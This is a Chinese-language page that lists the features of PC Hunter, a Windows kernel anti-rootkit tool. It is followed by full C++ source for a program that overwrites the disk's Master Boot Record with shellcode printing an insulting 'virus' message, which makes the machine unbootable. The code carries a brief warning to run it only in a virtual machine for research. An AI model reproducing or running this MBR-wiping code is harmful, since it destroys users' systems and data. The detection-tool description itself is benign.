

[PC Hunter](https://www.portablesoft.org/pc-hunter/) 大量使用了 Windows 内核技术，尤其是为了做一些检测而使用了些 Windows 未公开的内核数据结构，目前初步实现如下功能：

- 进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能
- 内核驱动模块查看，支持内核驱动模块的内存拷贝
- SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复 ssdt hook 和 inline hook
- CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego 等 Notify Routine 信息查看，并支持对这些 Notify Routine 的删除
- 端口信息查看，目前不支持2000系统
- 查看消息钩子
- 内核模块的 iat、eat、inline hook、patches 检测和恢复
- 磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除
- 注册表编辑
- 进程 iat、eat、inline hook、patches 检测和恢复
- 文件系统查看，支持基本的文件操作
- 查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME
- ObjectType Hook 检测和恢复
- DPC 定时器检测和删除
- MBR Rootkit 检测和修复
- 内核对象劫持检测
- WorkerThread 枚举
- Ndis 中一些回调信息枚举
- 硬件调试寄存器、调试相关API检测
- 枚举 SFilter/Fltmgr 的回调
- 系统用户名检测





```

[内核编程] 修改MBR使得系统无法开机的代码  [内核编程] 关于内核下修改MBR导致系统无法引导的代码研究！

该源码运行在W7和XP   XP以上的平台需要管理权限，并且假如测试研究请在虚拟机中实现，否则请勿运行，改源码作为研究学习之用！


#include <Windows.h>#include<iostream>
using namespace std;
unsigned char scode[]=
    "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
    "\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x41\x20\x61\x6d\x20\x76\x69\x72"
    "\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
int KillMbr()
{
    HANDLE hDevice;//定义一个通用的句柄函数成员，在后面的CreateFile函数中用来接收我们打开（返回）的句柄
    DWORD deBytesWrite,dwByteReturned;//该变量的左右在后面的    DeviceIoControl函数中用来接收返回的字节数，
    BYTE pMbr[512]={0};//定义一个字节数组512并且初始化为0
    memcpy(pMbr,scode,sizeof(scode));//C和C++的拷贝函数，1是缓冲区，2是拷贝的原目标，通俗的讲就是讲2拷贝进1，并且3是拷贝的大小
    pMbr[510]=0x55;//设置引导区倒数第3个得值
    pMbr[511]=0xAA;
    hDevice=CreateFile("\\\\.\\PHYSICALDRIVE0",//打开本地计算机磁盘
        GENERIC_WRITE|GENERIC_READ,//设置读取和写入的
        FILE_SHARE_READ|FILE_SHARE_WRITE,//设置共享读和写
        NULL,//指向SECURITY_ARRBIBUTES结构的指针
        OPEN_EXISTING,//指向一个常数值
        0,//指向一个或多个常数   通常设置为空
        NULL
        );
    if (hDevice==INVALID_HANDLE_VALUE)//判断句柄返回值
    {
        return -1;
    }
    DeviceIoControl(//函数可直接发送控制代码到指定的设备驱动程序，使用相应的的设备执行相应的操作函数
        hDevice,//设备句柄
        FSCTL_LOCK_VOLUME,//锁定，该参数的原型是 CTL_CODE(FILE_DEVICE_FILE_SYSTEM，应用程序调用驱动程序的控制命令，就是IOCTL_XXX IOCTLS命令
        NULL,//应用程序传递给驱动成宿的数据换乘区地址
        0,//应用程序传递给驱动程序的缓冲区大小字节数
        NULL,//驱动程序返回个应用程序的数据缓冲区地址
        0,//驱动程序返回给应用程序的数据缓冲区大小字节
        &dwByteReturned,//驱动程序实际返回给应用程序数据字节数地址
        NULL//这个结构用于重叠结构针对同步操作
        );
    WriteFile(hDevice,//写入设备
        pMbr,//写如的缓冲区
        sizeof(pMbr),//大小缓冲区
        &deBytesWrite,//用来接收返回   实际写入的字节数（也就是该成员变量中得值是我们写入的具体字节数或保存在里面）
        NULL//假如指定了FILE_FLAG_OVERLAPPED的前提打开这个参数必须引用一个特殊结构，该结构定义了一次异步的写操作
        //否则该参数一般Wie空
        );
    DeviceIoControl(//该函数和上一个一样 注释将不再写第二次
        hDevice,
        FSCTL_LOCK_VOLUME,
        NULL,
        0,
        NULL,
        0,
        &dwByteReturned,
        NULL
        );
        CloseHandle(hDevice);//关闭一个通用句柄
    ExitProcess(NULL);//退出进程
    return 0;

}
   
int main()
{
    KillMbr();//调用我们自定义的函数可以写成void （return 0;就不用写了） 但是我这里写成int  都可以的

    return 0;//返回值 对应主函数的int
}

```



